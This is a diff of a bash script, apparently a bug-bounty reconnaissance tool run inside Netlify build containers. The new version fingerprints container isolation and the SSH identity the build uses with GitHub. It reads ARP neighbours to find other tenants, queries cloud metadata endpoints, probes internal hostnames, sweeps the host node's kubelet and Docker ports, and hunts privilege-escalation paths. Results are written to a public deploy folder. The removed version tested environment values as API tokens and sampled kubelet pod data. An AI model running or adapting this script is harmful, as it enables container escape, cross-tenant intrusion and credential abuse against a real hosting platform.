@@ -1,65 +1,104 @@
 #!/usr/bin/env bash
-# H1 build-container recon v4 (read-only, RoE-clean, low-and-slow). Researcher: abedalaziz123sayed.
-# Tests candidate credentials IN-BUILD and exfils ONLY non-secret RESULTS (identity/scope/codes)
-# to public/recon4.txt. Full token values NEVER leave the build. Redacted env only.
+# H1 build-container recon v5 — MATERIALLY deeper than v4.
+# Covers the axes v4 never tested: SSH key/agent identity + whose GitHub identity it carries,
+# capabilities / namespaces / mounts (privesc + escape foundation), L2 neighbors (/proc/net/arp
+# = other tenants' builds on the same node), active TCP connections (the control-plane the build
+# phones home to), in-scope internal hosts from INSIDE the build, IMDSv2/GCP proper retry,
+# FEATURE_FLAGS extracted hostnames only, SUID/SGID + writable-path hunt.
+# Read-only, RoE-clean, low-and-slow. Researcher: abedalaziz123sayed.
+# EXFIL DISCIPLINE (hard): NEVER write a full secret/key/token VALUE to public/. Only identity,
+# scope, fingerprints, hostnames, codes, lengths, prefixes. Full key/token material stays in build.
 set +e
-PUB="public/recon4.txt"; mkdir -p public; : > "$PUB"
+PUB="public/recon5.txt"; mkdir -p public; : > "$PUB"
 p(){ echo "$*" >> "$PUB"; }
 UA="abedalaziz123sayed-h1-research"
 API="https://api.netlify.com/api/v1"
-# my own identities (to detect cross-tenant): nl1 acct slug abedalaziz123sayed, nl2 slug azizsayed360
-p "=====RECON4 START====="
-p "id=$(id) node=$HOST_NODE_IP site_env=$SITE_ID acct_env=$ACCOUNT_ID deploy_env=$DEPLOY_ID"
+p "=====RECON5 START====="
 
-p "## ENV_REDACTED (key len prefix6)"
-while IFS='=' read -r k v; do p "$k len=${#v} pfx=$(printf '%s' "$v" | head -c6)"; done < <(env | sort)
+p "## identity"
+p "id=$(id)"
+p "uname=$(uname -a)"
+p "os-release=$(head -3 /etc/os-release 2>/dev/null | tr '\n' '|')"
 
-p "## TOKEN_FILES"
-for f in "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml"; do
-  [ -f "$f" ] && p "$f EXISTS bytes=$(wc -c <"$f")" || p "$f absent"
+p "## container runtime / namespaces"
+p "proc1_cmdline=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null)"
+p "proc1_cgroup=$(cat /proc/1/cgroup 2>/dev/null | tr '\n' '|')"
+p "self_cgroup=$(cat /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+p "uid_map=$(cat /proc/self/uid_map 2>/dev/null | tr '\n' '|')"
+p "gid_map=$(cat /proc/self/gid_map 2>/dev/null | tr '\n' '|')"
+p "gvisor_dir=$([ -d /gvisor ] && echo present || echo absent)"
+CAPEFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
+CAPBND=$(grep CapBnd /proc/self/status 2>/dev/null | awk '{print $2}')
+p "CapEff=$CAPEFF CapBnd=$CAPBND"
+p "capsh=$(command -v capsh >/dev/null && capsh --print 2>/dev/null | head -4 | tr '\n' '|' || echo no-capsh)"
+p "## mounts (non-proc, looking for host paths / rw / sensitive)"
+grep -E ' / |/opt|/etc|/var|/tmp|/root|/home|/run ' /proc/self/mountinfo 2>/dev/null \
+  | awk '{print "  "$5" "$6" ["$7"]"}' | head -40 >> "$PUB"
+
+p "## ssh identity (fingerprints/identity ONLY, never key material)"
+ls -la ~/.ssh 2>/dev/null >> "$PUB"
+p "ssh_config_exists=$([ -f ~/.ssh/config ] && echo yes || echo no)"
+p "gitconfig (redacted):"
+sed -E 's#(://[^/]+@)#://REDACTED@#g' ~/.gitconfig 2>/dev/null >> "$PUB"
+p "SSH_AUTH_SOCK=$SSH_AUTH_SOCK  GIT_SSH_COMMAND=$GIT_SSH_COMMAND"
+p "ssh-add -l (fingerprints only):"
+ssh-add -l 2>&1 | head -10 >> "$PUB"
+# CRITICAL test: whose github identity does the build's SSH key represent? (identity string only)
+GITID=$(ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        -o ConnectTimeout=6 -T git@github.com 2>&1 | head -c 300)
+p "github_identity=$(printf '%s' "$GITID" | tr -d '\n')"
+p "known_hosts hostnames:"
+awk '{print $1}' ~/.ssh/known_hosts 2>/dev/null | tr ',' '\n' | sort -u | head -20 >> "$PUB"
+
+p "## network: L2 neighbors (cross-tenant) + routes + dns + active connections"
+p "## /proc/net/arp:"; cat /proc/net/arp 2>/dev/null >> "$PUB"
+p "## /proc/net/route:"; cat /proc/net/route 2>/dev/null >> "$PUB"
+p "## /etc/hosts:"; cat /etc/hosts 2>/dev/null >> "$PUB"
+p "## /etc/resolv.conf:"; cat /etc/resolv.conf 2>/dev/null >> "$PUB"
+# decode active TCP connections -> reveals the control-plane endpoint the build phones home to
+python3 - <<'PY' >> "$PUB"
+import struct
+st={1:'EST',2:'SYN',6:'TWAIT',10:'LISTEN',8:'CLOSEW'}
+def dec(a):
+    try:
+        h,p=a.split(':'); ip=struct.pack('<I',int(h,16))
+        return f'{ip[3]}.{ip[2]}.{ip[1]}.{ip[0]}:{int(p,16)}'
+    except: return '?:'+a
+print("## /proc/net/tcp (local -> remote, state):")
+try:
+    for ln in open('/proc/net/tcp').read().splitlines()[1:]:
+        f=ln.split()
+        print(f"  {dec(f[1])} -> {dec(f[2])} state={st.get(int(f[3],16),f[3])} uid={f[7]}")
+except Exception as e: print("  tcp_err",e)
+PY
+
+p "## FEATURE_FLAGS extracted URLs/hostnames (raw 9.4KB blob NOT exfiled)"
+printf '%s' "$FEATURE_FLAGS" | grep -oE 'https?://[a-zA-Z0-9._-]+|[a-z0-9-]+\.(netlify\.com|nsvcs\.net|netlify\.app|internal\.net)' 2>/dev/null | sort -u | head -40 >> "$PUB"
+
+p "## IMDS / metadata retry (proper PUT for v2)"
+IMDSTOK=$(curl -s --max-time 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null)
+p "aws_imdsv2_token_len=${#IMDSTOK}"
+[ -n "$IMDSTOK" ] && p "aws_imds_dir=$(curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $IMDSTOK" http://169.254.169.254/latest/meta-data/ 2>/dev/null | tr '\n' '|')"
+p "gcp_meta_code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null)"
+
+p "## in-scope internal endpoints from INSIDE the build (single light probes)"
+code(){ curl -s -k -o /dev/null -w '%{http_code}' --max-time 5 "$1" 2>/dev/null; }
+p "internal.netlify.com code=$(code https://internal.netlify.com/) resolve=$(getent hosts internal.netlify.com 2>/dev/null | head -1)"
+p "nf-server-api.services-prod.nsvcs.net resolve=$(getent hosts nf-server-api.services-prod.nsvcs.net 2>/dev/null | head -1)"
+for h in api.infra-prod.nsvcs.net build.infra-prod.nsvcs.net buildbot.infra-prod.nsvcs.net orchestration.infra-prod.nsvcs.net deploys.infra-prod.nsvcs.net; do
+  p "  $h resolve=$(getent hosts $h 2>/dev/null | head -1) code=$(code https://$h/)"
 done
-p "git_remote=$(git config --get remote.origin.url 2>/dev/null | sed -E 's#//[^@]*@#//REDACTED@#')"
-# also scan any netrc/credential content for a bearer we can test (redacted)
-NETRC_TOK=$(awk '/password/{print $2}' "$HOME/.netrc" 2>/dev/null | head -1)
-
-p "## TOKEN_IDENTITY+SCOPE (only 200s reported; token value hidden)"
-test_tok(){
-  local label="$1" tok="$2"
-  [ -z "$tok" ] && return
-  local code who
-  code=$(curl -s -o /tmp/w -w '%{http_code}' --max-time 6 -H "Authorization: Bearer $tok" -H "User-Agent: $UA" "$API/user" 2>/dev/null)
-  if [ "$code" = "200" ]; then
-    who=$(python3 -c "import json;d=json.load(open('/tmp/w'));print('uid='+str(d.get('id'))+' email='+str(d.get('email')))" 2>/dev/null)
-    local ns na slugs
-    curl -s -o /tmp/s --max-time 6 -H "Authorization: Bearer $tok" -H "User-Agent: $UA" "$API/sites?per_page=50" 2>/dev/null
-    curl -s -o /tmp/a --max-time 6 -H "Authorization: Bearer $tok" -H "User-Agent: $UA" "$API/accounts" 2>/dev/null
-    ns=$(python3 -c "import json;print(len(json.load(open('/tmp/s'))))" 2>/dev/null)
-    na=$(python3 -c "import json;print(len(json.load(open('/tmp/a'))))" 2>/dev/null)
-    slugs=$(python3 -c "import json;d=json.load(open('/tmp/a'));print(','.join(sorted(set(str(x.get('slug')) for x in d))[:8]))" 2>/dev/null)
-    p "TOKEN[$label] /user=200 :: $who | sites=$ns accounts=$na acct_slugs=[$slugs]"
-  else
-    p "TOKEN[$label] /user=$code (not a valid api token)"
-  fi
-}
-# candidate tokens: any env value that looks like a token (charset + length)
-env | while IFS='=' read -r k v; do
-  case "$v" in
-    *[!A-Za-z0-9._-]*) continue ;;  # skip values with spaces/special
-  esac
-  [ ${#v} -ge 24 ] && test_tok "env:$k" "$v"
+HN="$HOST_NODE_IP"
+p "## host node $HN port sweep (single GET each):"
+for pt in 80 443 2375 2376 8080 9090 10250 10255 4194 9100 6443; do
+  p "  ${HN}:${pt}=$(code http://${HN}:${pt})"
 done
-test_tok "netrc" "$NETRC_TOK"
 
-p "## HOST_NODE + INTERNAL reachability (codes)"
-code(){ curl -s -k -o /dev/null -w '%{http_code}' --max-time 4 "$1" 2>/dev/null; }
-p "kubelet_10255_pods=$(code http://$HOST_NODE_IP:10255/pods)"
-p "kubelet_10250_pods=$(code https://$HOST_NODE_IP:10250/pods)"
-p "node_9100_metrics=$(code http://$HOST_NODE_IP:9100/metrics)"
-p "cadvisor_4194=$(code http://$HOST_NODE_IP:4194/api/v1.3/subcontainers)"
-p "functions_origin=$(code https://functions-origin-api.services-prod.nsvcs.net/)"
-p "nfserverapi=$(code https://nf-server-api.services-prod.nsvcs.net/)"
-# small redacted sample of kubelet pods if reachable (proves control-plane data, minimal touch)
-KP=$(curl -s -k --max-time 4 "http://$HOST_NODE_IP:10255/pods" 2>/dev/null | head -c 400)
-[ -n "$KP" ] && p "kubelet_sample_first400=$(printf '%s' "$KP" | tr -d '\n' | head -c 400)"
-p "=====RECON4 END====="
+p "## SUID/SGID (privesc surface)"
+find / -xdev \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -30 >> "$PUB"
+p "## world-writable dirs in sensitive areas"
+find /etc /opt /usr/local -xdev -writable -type d 2>/dev/null | head -20 >> "$PUB"
+p "etc_hosts_writable=$([ -w /etc/hosts ] && echo YES || echo no) resolv_writable=$([ -w /etc/resolv.conf ] && echo YES || echo no)"
+
+p "=====RECON5 END====="
 cat "$PUB"
